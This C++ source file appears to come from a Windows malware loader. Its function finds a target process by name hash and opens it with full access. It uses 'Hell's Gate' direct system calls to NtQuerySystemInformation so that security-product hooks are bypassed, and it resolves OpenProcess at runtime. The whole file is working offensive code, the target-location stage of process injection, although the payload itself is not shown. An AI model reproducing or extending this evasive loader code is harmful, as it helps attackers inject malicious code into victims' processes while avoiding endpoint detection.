#include <stdio.h>
#include <Windows.h>
#include "Structs.h"
#include "Resolver.h"
#include "Loader.h"
#include "Utils.h"
#include "Crypto.h"

BOOL Loader::GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {
	ULONG uReturnLen1 = NULL;
	ULONG uReturnLen2 = NULL;

	PSYSTEM_PROCESS_INFORMATION SystemProcInfo = NULL;
	PVOID pValueToFree = NULL;
	NTSTATUS STATUS = NULL;

	// This will fail but its intentional:
	HellsGate(resolver.g_Sys.NtQuerySystemInformation.wSystemCall);
	HellDescent(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	// Allocating enough buffer for the returned array of 'SYSTEM_PROCESS_INFORMATION' struct
	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {
		return FALSE;
	}
	
	// since we will modify 'SystemProcInfo', we will save its intial value before the while loop to free it later
	pValueToFree = SystemProcInfo;

	// calling NtQuerySystemInformation with the right arguments, the output will be saved to 'SystemProcInfo'
	HellsGate(resolver.g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = HellDescent(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);
	if (STATUS != 0x0) {
#ifdef DEBUG
		PRINTA("[!] NtQuerySystemInformation Failed With Error : 0x%0.8X \n", STATUS);
#endif // DEBUG

		return FALSE;
	}

	while (TRUE) {
		// small check for the process's name size
		// comparing the enumerated process name to what we want to target
		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {
			// openning a handle to the target process and saving it, then breaking 
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = resolver.g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}

		// if NextEntryOffset is 0, we reached the end of the array
		if (!SystemProcInfo->NextEntryOffset)
			break;

		// moving to the next element in the array
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}

	// freeing using the initial address
	HeapFree(GetProcessHeap(), 0, pValueToFree);

	// checking if we got the target's process handle
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}
